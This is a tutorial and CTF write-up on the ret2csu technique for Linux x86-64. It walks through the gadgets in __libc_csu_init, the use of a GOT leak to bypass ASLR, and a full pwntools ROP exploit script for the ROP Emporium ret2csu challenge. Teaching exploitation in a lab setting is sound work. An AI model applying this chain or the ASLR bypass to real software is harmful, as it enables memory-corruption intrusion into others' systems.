# ret2csu

As far as my understanding goes, take it with a grain of salt.
Tests programs done on an AMD64 Linux Ubuntu

<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#sec-1">Who dis?</a></li>
<li><a href="#sec-2">When dis?</a></li>
<li><a href="#sec-3">Why dis?</a></li>
<li><a href="#sec-4">How even?</a></li>
<li><a href="#sec-5">But still.. how?</a></li>
<li><a href="#sec-6">In practice would you??</a></li>
</ul>
</div>
</div>


## Who dis?<a id="sec-1" name="sec-1"></a>

![Who dis?][whodis]

A Universal ROP specific to GNU/Linux that exists in every ELF executable linked against libc. (aka most of them)


## When dis?<a id="sec-2" name="sec-2"></a>

When in lack of sufficient gadgets to build your rop (aka lack of control over some register ie: when compiled code is tiny).


## Why dis?<a id="sec-3" name="sec-3"></a>

To have full control over a call.

To bypass some security measures (ie: ASLR) by leaking arbitrary executable memory resulting in a direct libc de-randomization.

## How even?<a id="sec-4" name="sec-4"></a>

***If I am actually compiling an empty C code (ie: only return) where does those ret2csu gadgets come from?***

To get a clearer picture one should try to understand the context. 


***How does a program start?***

A program binary image is probably created by the system linker ld which links against a set of provided objects.

By default, ld looks for a special symbol called `_start` in one of the object files linked into the program, and sets the entry point to the address of that symbol.

(set LD_DEBUG to all when running a program binary `$ LD_DEBUG=all ./program` to see the ld in action)


***How does a C code actually start?***

A correctly compiled and linked C code with gcc shares some attached code since C code requires some support libraries such as the gcc runtime and libc in order to run.

By following the special symbol `_start` of a gcc properly compiled and linked binary image, 

ie: `objdump -d mybinary | grep -A15 "_start"` , one will notice some call to `__libc_start_main` preceeding a hlt instruction.


***So how does control flow actually pass to our C code?***

Running the program stepi from GDB, then some Python script to produce a graph, a sequence of function calls can be ordered and summarized as the graph below:

![Function calls sequence][calls]


Cool, so what does `__libc_start_main` actually do? Ignoring some details, here's a list of things that it does for a statically linked program:

<ul>
<li>Figure out where environment variables are on the stack.</li>
<li>Prepare the auxiliary vector, if required.</li>
<li>Initialize thread-specific functionality (ie: pthreads)</li>
<li>Perform some security-related book-keeping.</li>
<li>Initialize libc itself.</li>
<li>Call the program initialization function through the passed pointer (init).</li>
<li>Register the program finalization function (fini) for execution on exit.</li>
<li>Call main(argc, argv, envp)</li>
<li>Call exit with the result of main as the exit code.</li>
</ul>

Some programming environments require running custom code before and after main.
This is implemented by means of cooperation between the compiler/linker and the C library.
For example, the `__libc_csu_init` (which, as you can see above, is called before the user's main) calls into special code that's inserted by the linker. 
The same goes for `__libc_csu_fini` and finalization.
You can also ask the compiler to register your function to be executed as one of the constructors or destructors. 

For example:


```c
#include <stdio.h>

int main() {
    printf("actual main");
    return 0;
}

__attribute__((constructor))
void myconstructor() {
    printf("this will run before main\n");
}
```

myconstructor will run before main. The linker places its address in a special array of constructors located in the .ctors section. 
`__libc_csu_init` goes over this array and calls all functions listed in it. Which is essentially what we will be using for ret2csu.

***So, since some extra code is attached, what would finding universal gadgets in this code result in?***

Obviously, universal ROP.

## But still.. how?<a id="sec-5" name="sec-5"></a>

***Where does these gadgets reside? What would they look like? How would one chain those? one asks.***

`__libc_csu_init` does some calls, would it have enough gadgets for a controlled call?

In fact, the disassembly of `__libc_csu_init` goes as follow (Ghidra, redacted):

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined __libc_csu_init()
             undefined         AL:1           <RETURN>
                             __libc_csu_init                                 XREF[4]:     Entry Point(*), 
                                                                                          _start:00401dfa(*), 
                                                                                          _start:00401dfa(*), 004ab2f0(*)  
        00403350 f3 0f 1e fa     ENDBR64


								 ** some instructions **


                             LAB_0040339d                                  
        0040339d 4c 8d 3d        LEA        R15,[__frame_dummy_init_array_entry]
                 5c 4c 0b 00
        004033a4 4c 8d 35        LEA        R14,[__do_global_dtors_aux_fini_array_entry]
                 65 4c 0b 00
        004033ab e8 50 dc        CALL       _init
                 ff ff
        004033b0 4d 29 fe        SUB        R14,R15
        004033b3 49 c1 fe 03     SAR        R14,0x3
        004033b7 74 1c           JZ         LAB_004033d5
        004033b9 31 db           XOR        EBX,EBX
        004033bb 0f 1f 44        NOP        dword ptr [RAX + RAX*0x1]
                 00 00
                             LAB_004033c0                                    
        004033c0 4c 89 ea        MOV        RDX,R13
        004033c3 4c 89 e6        MOV        RSI,R12
        004033c6 89 ef           MOV        EDI,EBP
        004033c8 41 ff 14 df     CALL       qword ptr [R15 + RBX*0x8] <-- 1
        004033cc 48 83 c3 01     ADD        RBX,0x1
        004033d0 49 39 de        CMP        R14,RBX                   <-- 2
        004033d3 75 eb           JNZ        LAB_004033c0 		      <-- 3
                             LAB_004033d5                         
        004033d5 48 83 c4 08     ADD        RSP,0x8                   <-- 4
        004033d9 5b              POP        RBX
        004033da 5d              POP        RBP
        004033db 41 5c           POP        R12
        004033dd 41 5d           POP        R13
        004033df 41 5e           POP        R14
        004033e1 41 5f           POP        R15
        004033e3 c3              RET                                  <-- 5

  ```

That sequence of pops starting at `004033d9` ending with a ret looks helpful, call it popper gadget.

The actual call setup starts at `004033c0` and ends with a call to the value of the address at `R15 + RBX*0x8`, call it caller gadget.

Gadgets are:

|    popper   |    caller         |
| ----------- | ----------------- |
| pop rbx     | mov    rdx, r13   |
| pop rbp     | mov    rsi, r12   |
| pop r12     | mov    edi, ebp   |
| pop r13     | call qword ptr [r15 + rbx*0x8] |
| pop r14     | 
| pop r15     |
| ret         |

Notice how the three parameters of the call and the call destination are *almost* totally controlled by popper gadget:

* *almost* as in control of the call destination is limited, the call is carried to the content at the address `R15 + RBX*0x8` not the value of the address as is.
* *almost* as in control of rdi register is limited, we control half of it (edi)

**If we could just somehow break free of those constraints..**

What if, we rop to popper gadget first, prepare our call parameters, rdi can be restored later anyways so second constraint is solved, that would be half the battle.

But how to setup the call destination?

Take a step back, notice the instructions numbered 1,2,3 and 4:
* [1] : We have full control over `R15` and `RBX`, setting `RBX` to 0 would result in a call to content of `R15`.
* [2] : Comparison in [2] can be satisfied by setting `R14` to `RBX + 1`.
* [3] : Since [2] is satisfied, comparison results in zero, execution continues forward.
* [4] : Notice top of stack changes.
* [5] : pop address from stack, call it.

What if, we satisfy *[1]* with a call (content of `R15`) that doesnt alter the state of our previously prepared registers (parameter registers)? 

If so, with *[2]* satisfied, when ropping, execution continues, *[4]* stack changes, add padding to fix that, fill those registers with dummy content, we wont need them anymore, place what you want to call on stack. *[5]* would return to that. PROFIT!


`_init` function is an example of such a function that satisfies our constraint, disassembled as below, state of registers is kept intact.


```
                             //
                             // .init 

                             undefined _init()
             undefined         AL:1           <RETURN>
                             _init                                           
        00401000 f3 0f 1e fa     ENDBR64
        00401004 48 83 ec 08     SUB        RSP,0x8
        00401008 48 c7 c0        MOV        RAX,0x0
                 00 00 00 00
        0040100f 48 85 c0        TEST       RAX,RAX
        00401012 74 02           JZ         LAB_00401016
        00401014 ff d0           CALL       RAX
                             LAB_00401016                                    
        00401016 48 83 c4 08     ADD        RSP,0x8
        0040101a c3              RET

```
If we could get some pointer to it, but wait remember those `_init` and `_fini` we saw earlier, some pointers must be kept somewhere.

In fact, in DYNAMIC variable ie. .dynamic section of executable we can find pointers to `_init` and `_fini` section.

Profit.

For de-randomizing libc, one can use &GOT_TABLE, coupled with some read(), write() or send(), recv() (ie: usually available in CTF challenges)

*ie: calling write@plt(fd, &GOT_TABLE[1], 8) to write to fd the first entry of the GOT_TABLE, leading in derandomizing libc*

## In practice would you??<a id="sec-6" name="sec-6"></a>

***ROP Emporium - ret2csu***

Binaries provided.

call ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) to get a flag.

```python
#!/usr/bin/python

from pwn import *
context.update(os='linux',arch='amd64',bits=64,endian='little')
p = process('ret2csu')

init = 0x600e38
win = 0x400510
pop_rdi = 0x4006a3
ret = 0x4004e6

def ret2csu(call,rdi,rsi,rdx):
	payload = p64(0x40069a)			# first call popper gadget
	payload += p64(0x00)            # pop rbx - set to 0 since it will be incremented later
	payload += p64(0x01)            # pop rbp - set to 1 so when compared to the incremented rbx results in equality
	payload += p64(init)            # pop r12
	payload += p64(rdi)             # pop r13 #rdi
	payload += p64(rsi)             # pop r14 #rsi
	payload += p64(rdx)             # pop r15 #rdx
	payload += p64(0x400680)        # 2nd call caller gadget
	payload += p64(0x00)            # add rsp,0x8 padding
	payload += p64(0x00)            # rbx
	payload += p64(0x00)            # rbp
	payload += p64(0x00)            # r12
	payload += p64(0x00)            # r13
	payload += p64(0x00)            # r14
	payload += p64(0x00)            # r15
	payload += p64(pop_rdi)         # transfer control to pop rdi; ret; gadget
	payload += p64(rdi)				# update rdi with correct unconstrained content
	payload += p64(ret)				# return gadget; jmp to address
	payload += p64(call)		    # actual wanted function call
	return payload


payload = ret2csu(win, 0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) # call(rdi,rsi,rdx)

eip = b'A'*40 # 32 bytes array size, 8 overwrite saved RBP
rop = eip + payload

p.recvuntil('> ')
p.sendline(rop)
print(p.recvallS())
```


## References:
 
 * https://eli.thegreenplace.net/2012/08/13/how-statically-linked-programs-run-on-linux
 * https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf
 * https://www.cs.stevens.edu/~jschauma/631A/elf.html
 * https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html

[whodis]: https://raw.githubusercontent.com/kaftejiman/pwn/main/ret2csu/whodis.jpeg 
[calls]: https://raw.githubusercontent.com/kaftejiman/pwn/main/ret2csu/call_seq.png